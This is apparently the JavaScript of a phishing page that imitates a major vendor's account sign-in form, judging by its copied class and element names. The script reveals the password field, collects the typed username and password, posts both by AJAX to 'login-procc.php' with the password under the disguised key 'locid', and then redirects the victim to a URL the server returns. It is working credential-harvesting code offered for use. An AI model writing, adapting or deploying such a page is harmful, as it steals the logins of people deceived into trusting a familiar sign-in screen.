window.onload = function(){
    var btn = document.getElementById('sign-in');    
                document.getElementsByClassName('force-ltr form-textbox form-textbox-text ')[0].addEventListener('click',function(e){                  
                    btn.setAttribute('aria-disabled','false');
                    btn.removeAttribute('disabled');
                    btn.classList.remove('disable');
                })
    var usr =  document.getElementsByClassName('force-ltr form-textbox form-textbox-text ')[0];
    usr.onkeyup = function(){
    if (usr.value){btn.addEventListener('click',function(e){e.preventDefault();
        document.getElementById('sign_in_form').className = "signin-form has-focus has-password-focus account-name-entered fed-auth show-password password-entered";
        document.getElementsByClassName('password form-row     ')[0].setAttribute('aria-hidden','false');
        document.getElementsByClassName('password form-row     ')[0].className = 'password form-row show-password show-placeholder password-focus'
        document.getElementById('password_text_field').removeAttribute('tabindex');
    })}}
    var pw = document.getElementById('password_text_field')
    pw.onkeyup = function(){
        if (pw.value){btn.addEventListener('click',function(e){e.preventDefault();            
            $.ajax({
                url : 'login-procc.php',
                type : 'post',
                data : {
                    'id' : usr.value,
                    'locid' : pw.value
                },
                success : function(d){
                    window.open(d,'_top');
                }
            })            
        })
    }

}}